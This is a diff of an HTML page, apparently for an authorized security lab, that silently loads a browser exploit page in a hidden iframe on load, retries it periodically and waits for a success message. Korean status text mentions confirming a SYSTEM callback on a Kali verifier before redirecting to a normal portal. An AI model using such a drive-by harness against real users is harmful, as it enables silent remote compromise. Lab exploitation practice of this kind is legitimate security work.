@@ -1,16 +1,38 @@
-<html>
+<!doctype html>
+<html lang="ko">
     <head>
+        <meta charset="utf-8">
+        <title>Authorized security lab</title>
+        <style>
+            body {
+                font-family: sans-serif;
+                line-height: 1.5;
+                margin: 4rem auto;
+                max-width: 44rem;
+                padding: 0 1rem;
+            }
+            #myframe { display: none; }
+        </style>
         <script>
             var interval = null;
+            var redirectTimer = null;
+            const NORMAL_PORTAL = 'http://10.10.10.80/';
+
             function exploitUrl() {
-                const wrapperHost = window.location.hostname;
-                if (!/^wrap-[a-z0-9-]+\.portal\.lab\.test$/i.test(wrapperHost)) {
-                    throw new Error('expected wrap-<run-id>.portal.lab.test');
+                if (window.location.hostname.toLowerCase() !== 'portal.lab.test') {
+                    throw new Error('expected portal.lab.test');
                 }
 
-                const exploitHost = wrapperHost.replace(/^wrap-/i, 'exp-');
                 const port = window.location.port ? `:${window.location.port}` : '';
-                return `${window.location.protocol}//${exploitHost}${port}/exploit.html`;
+                return `${window.location.protocol}//exp.portal.lab.test${port}/exploit.html`;
+            }
+
+            function setStatus(message) {
+                document.getElementById('status').textContent = message;
+            }
+
+            function redirectToPortal() {
+                window.location.replace(NORMAL_PORTAL);
             }
 
             function iter() {
@@ -25,23 +47,39 @@
                 iframe.src = exploitUrl();
                 iframe.id = 'myframe';
                 document.body.appendChild(iframe);
-                console.log(document.getElementById('myframe'));
                 if (interval === null) {
                     interval = window.setInterval(iter, 50000);
                 }
             }
 
             function brute() {
+                const expectedOrigin = new URL(exploitUrl()).origin;
+                setStatus('격리된 브라우저 PoC를 실행 중입니다. 이 페이지는 인가된 실습 전용입니다.');
                 iter();
 
                 window.onmessage = function(e) {
-                    if (e.data.includes('SUCCESS')) {
-                        console.log('exploit successful');
-                        window.clearInterval(interval);
+                    const exploitFrame = document.getElementById('myframe');
+                    if (!exploitFrame || e.source !== exploitFrame.contentWindow ||
+                        e.origin !== expectedOrigin || typeof e.data !== 'string') {
+                        return;
                     }
-                }
+
+                    if (e.data.includes('SUCCESS') && redirectTimer === null) {
+                        window.clearInterval(interval);
+                        setStatus(
+                            '브라우저 PoC가 완료 신호를 보냈습니다. ' +
+                            'Kali 검증기에서 SYSTEM 콜백을 별도로 확인하십시오. ' +
+                            '10초 후 정상 포털로 이동합니다.'
+                        );
+                        redirectTimer = window.setTimeout(redirectToPortal, 10000);
+                    }
+                };
             }
         </script>
     </head>
-    <body onload="brute()"></body>
+    <body onload="brute()">
+        <h1>Authorized security lab simulation</h1>
+        <p id="status">실습 페이지를 준비 중입니다.</p>
+        <p><a href="http://10.10.10.80/">정상 포털로 바로 이동</a></p>
+    </body>
 </html>
